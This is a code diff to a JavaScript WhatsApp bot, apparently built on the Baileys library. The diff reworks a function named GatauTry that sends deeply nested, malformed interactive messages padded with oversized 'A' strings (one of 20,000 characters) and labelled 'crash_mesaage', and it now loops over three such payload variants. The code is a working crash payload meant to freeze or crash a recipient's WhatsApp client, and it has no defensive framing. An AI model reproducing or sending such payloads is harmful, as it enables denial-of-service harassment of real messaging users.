@@ -1357,37 +1357,42 @@ async function initializeBot() {
 }
 
 async function GatauTry(sock, target) {
-  const msg = {
-    groupMentionedMessage: {
-      message: {
-        ephemeralMessage: {
-          message: {
-            liveLocationMessage: {
-              message: {
-                interactiveMessage: {
-                  body: {
-                    text: "⭑‌By Nexvøid! ༑"
+  const me = target || sock.user.id.split(":")[0] + "@s.whatsapp.net";
+  const names = ["catalog_mesaage", "visibel_mesaage", "crash_mesaage"];
+
+  for (const name of names) {
+    const msg = {
+      groupMentionedMessage: {
+        message: {
+          ephemeralMessage: {
+            message: {
+              liveLocationMessage: {
+                message: {
+                  interactiveMessage: {
+                    body: {
+                      text: "⭑‌By Nexvøid! ༑"
+                    },
+                    nativeFlowMessage: {
+                      extra: "\u31040",
+                      buttons: "A".repeat(20000),
+                      extra1: "A".repeat(5555),
+                      name: name
+                    },
+                    buttons: "A".repeat(4)
                   },
-                  nativeFlowMessage: {
-                    extra: "\u31040",
-                    buttons: "A".repeat(20000),
-                    extra1: "A".repeat(5555),
-                    name: "crash_mesaage"
-                  },
-                  buttons: "A".repeat(4)
-                },
-                buttons: "A".repeat(555)
+                  buttons: "A".repeat(555)
+                }
               }
             }
           }
         }
       }
-    }
-  };
+    };
 
-  await sock.relayMessage(target, msg, {
-    messageId: sock.generateMessageTag()
-  });
+    await sock.relayMessage(me, msg, {
+      messageId: sock.generateMessageTag()
+    });
+  }
 }
 
 async function anjay(sock, target) {
